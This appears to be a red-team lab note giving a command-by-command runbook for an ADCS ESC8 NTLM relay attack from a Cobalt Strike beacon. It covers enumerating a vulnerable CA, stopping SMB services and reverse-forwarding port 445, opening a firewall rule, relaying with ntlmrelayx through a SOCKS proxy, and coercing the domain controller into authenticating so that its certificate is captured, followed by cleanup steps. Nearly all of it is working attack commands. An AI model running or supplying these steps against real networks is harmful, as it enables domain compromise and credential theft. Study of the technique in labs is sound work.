enumerate the CA for vulnerablities
    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
    output shows 'ESC8: The CA supports HTTP web enrollment without channel binding.'

now we must start a socks proxy
    beacon> socks 1080 socks5

confirm if 445 is currently bound
    beacon> netstat
    output shows it is bound with PID 4

lets modify lanmanserver to not auto start  
    beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4

now stop the services
    beacon> sc_stop lanmanserver
    beacon> sc_stop srv2
    beacon> sc_stop srvnet

check netstat to show it is unbound

start reverse port forward to bind to 445 and forward to 7445 on the attacker desktop
    beacon> rportforward_local 445 localhost 7445

port 445 inbound traffic is not always allowed, so we can add a firewall rule
    beacon> powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445

run our kali docker container
    PS C:\Users\Attacker> docker container start -i kali-1

configure proxychains to use cobalt's socks proxy
    modify last line of /etc/proxychains to 'socks5 10.0.0.5 1080'

use ntlmrelayx and proxychains to relay incoming authentication requests 
    --# proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

once this is running, coerce the domain controller into authenticating to the current machine
    beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108

we will see the request in our kali terminal, once we get the LON-DC-1.pfx file downloaded we can stop ntlmrelayx

cleanup:
    stop the proxy
        beacon> socks stop
    stop the port forward
        beacon> rportforward stop 445
    reconfigure the service back to normal:
        beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
        beacon> sc_start srvnet
        beacon> sc_start srv2
        beacon> sc_start lanmanserver
    remove firewall rule
        beacon> powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
